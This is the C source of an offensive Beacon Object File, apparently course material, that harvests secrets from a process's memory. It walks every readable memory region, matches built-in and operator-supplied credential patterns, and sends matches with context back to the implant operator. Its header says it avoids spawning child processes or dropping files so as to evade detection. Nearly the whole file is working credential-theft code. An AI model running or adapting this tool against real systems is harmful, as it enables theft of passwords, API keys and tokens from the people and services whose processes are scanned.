/*
 * credsMem.c — process-memory secret harvest (OSAI T1).
 * Course: M11.4 "credential harvesting via process memory", M3.2.1 sys-prompt
 *         creds, M7.2.1 exfil keywords.  ATLAS AML.T0024 / AML.T0025.
 * In-process ReadProcessMemory sweep — no procdump/mimikatz child, no file drop.
 *
 * args: int pid(0=self), int contextBytes(default 48), str extraPattern(optional)
 */
#include "aibof.h"

static void scan_region(HANDLE hp, void* base, SIZE_T sz, int ctx, const char* extra) {
  if (sz == 0 || sz > (64 * 1024 * 1024)) return; /* cap per region */
  unsigned char* mem = (unsigned char*)intAlloc((SIZE_T)sz + 1);
  if (!mem) return;
  SIZE_T got = 0;
  if (KERNEL32$ReadProcessMemory(hp, base, mem, sz, &got) && got > 0) {
    for (SIZE_T i = 0; i < got; i++) {
      const char* hit = NULL;
      for (int k = 0; AIBOF_SECRETS[k]; k++) {
        const char* pl = AIBOF_SECRETS[k];
        int plen = (int)xlen(pl);
        if (i + plen > got) continue;
        int bad = 0;
        for (int j = 0; j < plen; j++) if (mem[i + j] != (unsigned char)pl[j]) { bad = 1; break; }
        if (!bad) { hit = pl; break; }
      }
      if (!hit && extra && *extra) {
        int plen = (int)xlen(extra);
        if (i + plen <= got) {
          int bad = 0;
          for (int j = 0; j < plen; j++) if (mem[i + j] != (unsigned char)extra[j]) { bad = 1; break; }
          if (!bad) hit = extra;
        }
      }
      if (hit) {
        SIZE_T s = i > (SIZE_T)ctx ? i - ctx : 0;
        SIZE_T e = i + xlen(hit) + ctx; if (e > got) e = got;
        char out[1200]; int o = 0;
        /* build printable context */
        for (SIZE_T j = s; j < e && o < 1100; j++) {
          char c = (char)mem[j];
          out[o++] = (c >= 32 && c < 127) ? c : '.';
        }
        out[o] = 0;
        BeaconPrintf(CALLBACK_OUTPUT, "0x%p %s :: %s\n", base, hit, out);
        i += xlen(hit);
      }
    }
  }
  intFree(mem);
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  int pid = BeaconDataInt(&p);
  int ctx = BeaconDataInt(&p);
  char* extra = BeaconDataExtract(&p, NULL);
  if (ctx <= 0 || ctx > 256) ctx = 48;
  if (pid == 0) pid = (int)KERNEL32$GetCurrentProcessId();

  BeaconPrintf(CALLBACK_OUTPUT, "[*] credsMem pid=%d ctx=%d extra=%s\n", pid, ctx, extra ? extra : "-");

  HANDLE hp = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)pid);
  if (!hp || hp == INVALID_HANDLE_VALUE) {
    BeaconPrintf(CALLBACK_ERROR, "OpenProcess %d failed (%lu)\n", pid, KERNEL32$GetLastError());
    return;
  }
  MEMORY_BASIC_INFORMATION mbi;
  unsigned char* addr = 0;
  int regions = 0;
  while (KERNEL32$VirtualQueryEx(hp, addr, &mbi, sizeof(mbi))) {
    if (mbi.State == MEM_COMMIT &&
        !(mbi.Protect & PAGE_GUARD) &&
        !(mbi.Protect & PAGE_NOACCESS) &&
        (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY |
                        PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
      scan_region(hp, mbi.BaseAddress, mbi.RegionSize, ctx, extra);
      regions++;
    }
    SIZE_T step = mbi.RegionSize ? mbi.RegionSize : 0x1000;
    addr += step;
    if ((SIZE_T)addr < step) break; /* wrap */
  }
  KERNEL32$CloseHandle(hp);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] credsMem done, %d regions scanned\n", regions);
}